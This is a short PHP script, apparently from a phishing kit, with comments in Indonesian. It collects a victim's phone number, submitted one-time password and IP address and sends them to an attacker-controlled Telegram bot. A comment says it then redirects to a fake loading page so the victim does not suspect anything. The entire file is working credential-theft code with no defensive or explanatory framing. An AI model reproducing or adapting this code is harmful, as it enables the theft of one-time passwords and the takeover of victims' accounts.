<?php
session_start();
include 'config.php';

$phone = $_SESSION['phone'] ?? 'Tidak diketahui';
$otp = $_POST['otp'] ?? 'Kosong';
$ip = $_SERVER['REMOTE_ADDR'];

$message = "🔐 DATA LENGKAP\n";
$message .= "Nomor: $phone\n";
$message .= "OTP: $otp\n";
$message .= "IP: $ip\n";
$message .= "Waktu: " . date('Y-m-d H:i:s');

// Kirim ke Telegram
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// Redirect ke halaman error/loading palsu agar korban tidak curiga
header("Location: loading.html");
exit;
?>
